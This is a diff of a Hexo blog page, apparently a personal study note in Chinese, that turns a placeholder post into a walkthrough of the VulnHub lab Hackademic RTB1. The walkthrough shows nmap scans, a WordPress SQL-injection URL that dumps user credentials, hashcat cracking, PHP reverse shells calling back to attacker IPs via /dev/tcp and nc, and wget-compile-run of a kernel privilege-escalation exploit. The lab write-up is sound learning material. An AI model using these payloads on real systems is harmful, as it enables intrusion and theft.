@@ -10,7 +10,7 @@
     
     
     
-    <title>测试文章 | Hexo</title>
+    <title>rtb1BaJi | Hexo</title>
     <!-- inject:style -->
     <link href="/css/style.css" rel="stylesheet" type="text/css">
     <!-- endinject -->
@@ -161,13 +161,13 @@
     <div class="cube-content">
         <div class="cube-left">
             <div class="cube-article">
-    <h1 class="title">测试文章</h1>
+    <h1 class="title">rtb1BaJi</h1>
         
             <div class="cube-article-header">
                 <div class="cube-article-date">
                     <i class="cube-icon cube-icon-date" aria-hidden="true"></i>
                     <!-- moment.js对象 -->
-                    2024-04-16
+                    2024-07-31
                 </div>
                 <div class="cube-article-tags">
     <i class="cube-icon cube-icon-tag" aria-hidden="true"></i>
@@ -177,15 +177,68 @@
             
                     <div class="cube-article-content cube-markdown">
                         
-                            <p>title: 测试文章 date: 2021-06-10 16:35:20 tags: </p>
-<p><img src="/2024/04/16/%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0/5.png" alt="测试文章"></p>
-<p><img src="/2024/04/16/%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0/1.png" alt="测试文章"></p>
-<p>hexo new post “文章名”</p>
-<p>hexo d -g 上传文章</p>
-<p>hexo s 看本地，调试</p>
-<p>这个是只显示上面的内容</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--more--&gt;</span><br></pre></td></tr></table></figure>
+                            <h1 id="1下载地址"><a href="#1下载地址" class="headerlink" title="1下载地址"></a>1下载地址</h1><p><a target="_blank" rel="noopener" href="https://download.vulnhub.com/hackademic/Hackademic.RTB1.zip">https://download.vulnhub.com/hackademic/Hackademic.RTB1.zip</a></p>
+<span id="more"></span>
 
+<p><img src="/2024/07/31/rtb1BaJi/1.png" alt="rtb1BaJi"></p>
+<h1 id="2信息收集"><a href="#2信息收集" class="headerlink" title="2信息收集"></a>2信息收集</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">nmap  -sP 192.168.49.0/24   扫出139</span><br><span class="line">nmap --min-rate 10000 -p- 192.168.49.139</span><br><span class="line">nmap -sT -sV -O -p22,80 192.168.49.139</span><br><span class="line">看版本信息，用tcp协议 </span><br><span class="line">namp -sU --min-rate 10000 -p- 192.168.49.139  速度10000 用utp，-p-扫所有端口</span><br><span class="line">nmap --script=vuln -p22,80 192.168.49.139 </span><br><span class="line">比 namp -sC -p22,80 192.168.49.139强得多</span><br><span class="line">看到80的dos漏洞</span><br></pre></td></tr></table></figure>
+
+<p>80开启，22是关的直接不用考虑</p>
+<p><img src="/2024/07/31/rtb1BaJi/2.png" alt="rtb1BaJi"></p>
+<p>看到linux_kernel:2.6 </p>
+<p>访问网站</p>
+<p>目标是一个连接  告诉你要获得root权限</p>
+<p>随便点点</p>
+<p>说root下有一个key.txt让我们获得</p>
+<p>whatweb没扫到，看插件时wordpress</p>
+<p>看网页源码看到</p>
+<pre><code>&lt;meta name=&quot;generator&quot; content=&quot;WordPress 1.5.1.1&quot; /&gt; 
+</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit wordpress 1.5.1.1</span><br></pre></td></tr></table></figure>
+
+<p>看到sql注入</p>
+<p><img src="/2024/07/31/rtb1BaJi/3.png" alt="rtb1BaJi"></p>
+<p>用’试一下爆出了sql语句</p>
+<p>and 1&#x3D;1&#x2F;2# 对’ “  都会报错 但对整数型没用</p>
+<p>应该试整数型 order by</p>
+<p>搜一下</p>
+<p>wordpress database description</p>
+<p>点开1.5的数据库架构</p>
+<p><img src="/2024/07/31/rtb1BaJi/4.png" alt="rtb1BaJi"></p>
+<p>直接搜就行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.49.139/Hackademic_RTB1/?cat=0 union select 1,group_concat(user_login,0x2d,user_pass,0x2d,user_level),3,4,5  from wp_users</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/07/31/rtb1BaJi/5.png" alt="rtb1BaJi"></p>
+<p>0x2d是-</p>
+<p>看到权限10的，</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hash-identifier &#x27;7cbb3252ba6b7e9c422fac5334d22054&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>看到是md5加密</p>
+<p>直接在线网站即可 q1w2e3</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> hashcat -m 0 -a 0 7cbb3252ba6b7e9c422fac5334d22054 /usr/share/wordlists/rockyou.txt</span><br><span class="line"></span><br><span class="line">-m 0 就是md5  直接破解</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u url </span><br><span class="line">没啥有用的</span><br><span class="line">wp-admin是这个cms的常用的</span><br><span class="line">访问，登录 记得 点目标再输入这个</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/07/31/rtb1BaJi/6.png" alt="rtb1BaJi"></p>
+<p>添加php，勾上 允许上传</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php exec(&quot;/bin/bash -c &#x27;bash -i &gt;&amp; /dev/tcp/10.10.10.128/1234 0&gt;&amp;1&#x27;&quot;); ?&gt; </span><br></pre></td></tr></table></figure>
+
+<p>我用其他的没反弹上</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">@exec(&quot;nc -e /bin/bash 192.168.49.129 8888&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>我用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br><span class="line">没啥用，在这，但是还是用一下踏实</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">id</span><br><span class="line"> find / -user root -perm -4000 2&gt;/dev/null</span><br><span class="line"> 看到sudo</span><br><span class="line"> sudo -l  要密码不行</span><br><span class="line"> uname -a</span><br><span class="line"> 2.6.31 版本那么老试一下</span><br><span class="line"> </span><br><span class="line"> searchsploit Linux Kernel  2.6.3 | grep -i &#x27;Privilege &#x27;  </span><br><span class="line">  searchsploit   2.6.3 | grep -i &#x27;Privilege &#x27;    这样也行</span><br><span class="line">  </span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/07/31/rtb1BaJi/7.png" alt="rtb1BaJi"></p>
+<p>看到15285.c</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit -m 15285 自己下</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/07/31/rtb1BaJi/8.png" alt="rtb1BaJi"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 8888</span><br><span class="line">cd /tmp</span><br><span class="line">wget http://192.168.49.129:8888/15285.c</span><br><span class="line">gcc 15285.c -o 15285</span><br><span class="line">./15285 </span><br><span class="line">获得root权限</span><br><span class="line">cd /root</span><br><span class="line">ls</span><br><span class="line">cat key.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/07/31/rtb1BaJi/9.png" alt="rtb1BaJi"></p>
 
                     </div>
 </div>
@@ -193,17 +246,10 @@
     <div class="cube-article-nav">
         <ul>
             
-                <li class="prev">
-                    <a href="/2024/04/18/%E6%8A%A4%E7%BD%91%E5%9F%BA%E6%9C%AC%E9%97%AE%E9%A2%98/">
-                        <i class="cube-icon cube-prev" aria-hidden="true"></i>
-                        护网基本问题
-                    </a>
-                </li>
-                
                     
                         <li class="next">
-                            <a href="/2024/04/14/1/">
-                                1
+                            <a href="/2024/07/31/xiaoBaChang/">
+                                xiaoBaChang
                                     <i class="cube-icon cube-next" aria-hidden="true"></i>
                             </a>
                         </li>
